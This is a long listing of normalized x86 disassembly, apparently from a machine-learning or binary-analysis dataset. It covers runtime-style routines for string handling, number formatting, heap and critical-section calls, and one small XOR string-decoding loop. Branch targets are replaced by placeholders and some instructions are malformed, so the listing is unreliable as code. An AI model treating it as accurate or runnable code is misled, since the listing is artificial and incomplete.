mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] edi
jne r-xdata
lea esi [ ebp - 0x14 ]
call sub_100173d0
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x14 ]
call sub_10053a60
test eax eax
je r-xdata
lea esi [ ebp - 0x14 ]
call sub_100173d0
mov eax 0x3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
lea ebx [ esi + eax * 4 ]
cmp esi ebx
je r-xdata
lea esi [ ebp - 0x14 ]
call sub_100173d0
mov eax 0x6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x14 ]
call sub_100173d0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0xa
jae r-xdata
mov ecx [ esi ]
mov edx [ ebp + 0xc ]
push ecx
push edx
mov ecx 0x104
call sub_10067840
test eax eax
jne r-xdata
lea esi [ ebp - 0x14 ]
call sub_100173d0
mov eax 0x7
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add [ ebp + 0xc ] 0x208
add esi 0x4
inc edi
cmp esi ebx
jne r-xdata
sub_100253f0
push ebp
mov ebp esp
shr eax 0x1
mov ecx 0x0
je r-xdata
mov ecx 0x80070057
cmp eax 0x7fffffff
jbe r-xdata
mov eax ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push edi
lea esi [ eax - 0x1 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push ebx
xor edi edi
call sub_10009d9f
add esp 0x10
test eax eax
js r-xdata
test ecx ecx
js r-xdata
xor eax eax
mov [ ebx + esi * 2 ] ax
mov edi 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
xor edx edx
mov eax edi
pop edi
mov [ ebx + esi * 2 ] dx
pop esi
pop ebp
retn
sub_10025450
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10027411
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_100254a0
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push esi
push edi
lea esi [ ecx - 0x1 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push ebx
xor edi edi
call sub_10009d9f
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
xor eax eax
mov [ ebx + esi * 2 ] ax
mov edi 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
mov eax edi
pop edi
pop esi
xor edx edx
mov eax edi
pop edi
mov [ ebx + esi * 2 ] dx
pop esi
pop ebp
retn
sub_10025520
push ebp
mov ebp esp
sub esp 0x258
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x258 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
push ebx
push esi
push edi
mov edi edi
lea edx [ ebp - 0x34 ]
mov eax 0x1c
call sub_1000a6f0
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
push 0x5c
push ebx
call sub_1005cfc8
add esp 0x8
lea ebx [ eax + 0x2 ]
push 0x208
lea eax [ ebp - 0x250 ]
push 0x0
push eax
call sub_10078970
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov esi [ edx + 0x14 ]
push 0x2e
push esi
call sub_1005cfc8
mov edi eax
add esp 0x14
test edi edi
je r-xdata
xor eax eax
mov edi edi
lea edx [ ebp - 0x48 ]
mov eax 0x11c
call sub_1000a6f0
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub eax esi
sar eax 0x1
add eax eax
push eax
lea ecx [ ebp - 0x250 ]
push esi
push ecx
call sub_10078600
mov ecx [ r--data ]
add esp 0xc
xor eax eax
lea ecx [ ecx ]
inc eax
cmp eax 0x18
jb r-xdata
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x5c
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
mov esi [ lstrcatW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x250 ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call esi
push edi
lea eax [ ebp - 0x250 ]
push eax
call esi
push ebx
lea ecx [ ebp - 0x250 ]
push ecx
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x254 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
mov edx [ ebp - 0x254 ]
mov eax [ edx ]
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov [ edx + 0x50 ] eax
inc [ eax + 0x1c ]
mov ecx [ ebp - 0x254 ]
mov edx [ ecx ]
mov ebx [ edx + 0x4 ]
push 0x5c
push ebx
call sub_1005cfc8
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100256b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
mov ecx edi
mov esi ebx
call sub_1000d420
test eax eax
jne r-xdata
mov edx [ edi + 0x108 ]
mov eax [ edi + 0x100 ]
lea eax [ edx + eax + 0x7 ]
lea ecx [ eax + eax * 2 ]
add ecx [ edi + 0x50 ]
mov eax esi
sub eax ebx
cmp eax ecx
jae r-xdata
lea ebx [ ebx ]
lea ebx [ esi - 0x1 ]
lea edx [ ebx - 0x5 ]
mov ecx eax
mov [ ebp - 0x4 ] ecx
cmp eax edx
jb r-xdata
mov eax ecx
mov ecx [ ebp + 0x8 ]
add esi ebx
push esi
push ecx
mov ecx edi
call sub_1000d420
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea esi [ ecx + ebx ]
shr esi 0x1
push esi
push eax
mov ecx edi
call sub_1000d420
test eax eax
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] esi
cmp eax 0x2
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea ecx [ ebx - 0x5 ]
cmp [ ebp - 0x4 ] ecx
jb r-xdata
sub_10025760
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x14 ]
push ebx
cdq
push esi
mov esi eax
add esi [ ebp + 0xc ]
push edi
mov edi [ ecx + 0x24 ]
mov eax [ edi ]
mov ebx edx
adc ebx [ ebp + 0x10 ]
test eax eax
je r-xdata
mov edx [ r--data ]
cmp esi edx
jne r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x24 ] 0x1
je r-xdata
cmp ebx [ r--data ]
je r-xdata
mov [ ecx + 0x3c ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ebx [ r--data ]
mov esi edx
mov edi [ edi ]
mov [ esp + 0xc ] edi
test edi edi
je r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
jg r-xdata
jg r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ r--data ]
jl r-xdata
jl r-xdata
sub edi [ esp + 0xc ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x24 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ esp + 0xc ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x20 ]
mov edx [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_10025881
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_10025903
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_10015f91
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_10047418
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_1002595f
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_10020a90
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_100259b6
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_1004cd88
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1001905b
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10035b1e
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x20
sub_10025a80
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
mov eax edx
push esi
mov [ ebp - 0x4 ] 0x0
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x10 ]
sub eax esi
push eax
push edx
push 0x0
call sub_1003cbd0
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_100172f0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_10025acc
push 0x80
mov eax sub_1007e782
call sub_10007703
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x8c ] eax
movzx eax [ ebp + 0x1c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x2c ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x68 ]
push eax
mov ecx ebx
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_10064bde
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x78 ] eax
call sub_1002a730
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_1002a674
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
and [ ebp - 0x1c ] 0x0
movzx eax ax
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
lea eax [ edi + 0x8 ]
push eax
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x2
call sub_1005e05a
movzx eax ax
mov [ ebp - 0x70 ] eax
mov al [ esi ]
add esp 0xc
cmp al 0x2b
je r-xdata
mov [ ebp - 0x84 ] 0x1
cmp al 0x2d
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
and [ ebp - 0x54 ] eax
and [ ebp - 0x84 ] 0x0
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
call sub_1001bc97
mov eax [ eax ]
push [ ebp - 0x50 ]
mov al [ eax ]
push 0x65
push esi
mov [ ebp - 0x58 ] al
mov [ ebp - 0x57 ] 0x65
call sub_100783e0
push [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
movsx eax [ ebp - 0x58 ]
push eax
push esi
call sub_100783e0
add esp 0x18
mov [ ebp - 0x60 ] eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x50 ]
add eax [ ebp - 0x54 ]
mov ecx [ ebx + 0x20 ]
add eax [ ebp - 0x74 ]
xor edx edx
add eax [ ebp - 0x5c ]
cmp [ ebx + 0x24 ] edx
jl r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x4c ] edx
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx eax [ ebp - 0x58 ]
push [ ebp - 0x50 ]
push eax
push esi
call sub_100783e0
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
jne r-xdata
cmp ecx eax
jbe r-xdata
cmp ecx edx
jbe r-xdata
push [ ebp - 0x50 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_1005be50
mov eax [ ebp - 0x4c ]
test eax eax
jne r-xdata
push [ ebp - 0x50 ]
push 0x65
push esi
call sub_100783e0
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x80 ]
sub eax esi
inc eax
mov [ ebp - 0x60 ] eax
dec eax
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x88 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10002dcf
mov ecx [ eax ]
push [ ebp - 0x5c ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x88 ]
push eax
push edi
call sub_10017235
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x78 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x6c ] ecx
mov ecx [ ebp + 0x14 ]
movzx eax ax
mov [ ebp - 0x68 ] ecx
push eax
lea ecx [ ebp - 0x6c ]
call sub_1002836c
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x68 ]
push [ ebp - 0x70 ]
mov eax [ ebp - 0x6c ]
push ecx
push eax
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x6c ]
push eax
push edi
mov [ ebp + 0x14 ] ecx
call sub_10017235
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x60 ]
add esp 0x18
add esi eax
sub [ ebp - 0x50 ] eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x64 ]
push [ ebp - 0x7c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10017235
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
and [ ebp - 0x4c ] 0x0
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x84 ] edx
jbe r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
push 0x30
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x2c ]
call sub_10050f80
jmp r-xdata
push [ ebp - 0x80 ]
lea eax [ ebp - 0x6c ]
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10002dcf
mov ecx [ eax ]
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_10017235
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x7c ]
xor esi esi
push eax
push ecx
push [ ebp - 0x8c ]
mov [ ebp + 0x14 ] eax
push edi
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x24 ] esi
call sub_10017235
add esp 0x4c
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
push esi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
mov eax [ ebp - 0x8c ]
call sub_10019c00
retn
push [ ebp - 0x80 ]
sub eax esi
inc eax
mov [ ebp - 0x68 ] eax
dec eax
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10002dcf
mov ecx [ eax ]
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_10017235
mov ecx [ eax ]
and [ ebp - 0x54 ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x34
test [ ebx + 0x14 ] 0x4
mov [ ebp + 0x14 ] ecx
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1000a6a2
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp - 0x50 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
push 0x30
push [ ebp - 0x54 ]
sub eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_10051fc9
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
call sub_10050f80
and [ ebp - 0x5c ] 0x0
mov eax [ ebp - 0x4c ]
mov eax [ ebp - 0x60 ]
push 0x30
lea ecx [ ebp - 0x2c ]
test eax eax
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_1000a6a2
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x68 ]
add esp 0x18
add esi eax
sub [ ebp - 0x50 ] eax
mov ecx r--data
push [ ebp - 0x74 ]
sub eax esi
mov [ ebp - 0x60 ] eax
inc eax
push eax
call sub_10051fc9
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
push [ ebp - 0x60 ]
call sub_10051fc9
and [ ebp - 0x74 ] 0x0
push [ ebp - 0x5c ]
call sub_10050f80
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea esi [ ebp - 0x48 ]
and [ ebp - 0x5c ] 0x0
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
push eax
call sub_1007c060
pop ecx
pop ecx
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov esi [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx [ ebp - 0x84 ]
movsx eax al
cmp eax ecx
jae r-xdata
mov eax [ ebp - 0x1c ]
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x50 ] eax
lea esi [ ebp - 0x2c ]
sub [ ebp - 0x4c ] eax
push 0x0
push 0x1
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
call sub_10051fc9
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_10025f6a
push 0x10
push r--data
call sub_10078b50
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x9
call sub_1002788e
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_10078b95
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10038317
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_10067466
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10026036
mov eax [ ebp - 0x1c ]
sub_1002603e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
pop ebp
retn
push eax
push 0x0
call sub_10011a54
pop ecx
pop ecx
sub_10026059
mov edi edi
push ebp
mov ebp esp
push ecx
mov cx [ ebp + 0x8 ]
movzx eax cx
mov edx 0xffff
mov [ ebp - 0x4 ] eax
cmp cx dx
je r-xdata
leave
retn
mov edx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push edx
call sub_100471a2
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push esi
mov esi 0x100
cmp cx si
pop esi
jae r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ecx - 0x61 ]
cmp dx 0x19
ja r-xdata
sub cx 0x20
movzx eax cx
leave
retn
sub_100260d0
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
pop esi
jmp eax
sub_10026104
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] cl
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
push r--data
mov [ ecx ] eax
mov [ ecx + 0x4 ] al
call sub_1005daf0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10026143
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
test eax eax
jne r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
call sub_100539e5
mov esi [ eax + 0x8 ]
call sub_100382f1
mov edi eax
jmp r-xdata
and [ ebp + 0x14 ] 0x0
push edi
call sub_10044a54
pop ecx
lea ecx [ ebp + 0x14 ]
push ecx
push 0x0
push eax
call sub_1005d8b6
pop ecx
push eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x0
push edi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov ax [ ebp + 0xc ]
mov ecx 0xff
cmp ax cx
ja r-xdata
test esi esi
jne r-xdata
call sub_10012991
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_100261d5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
pop ebp
retn
sub_10026208
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
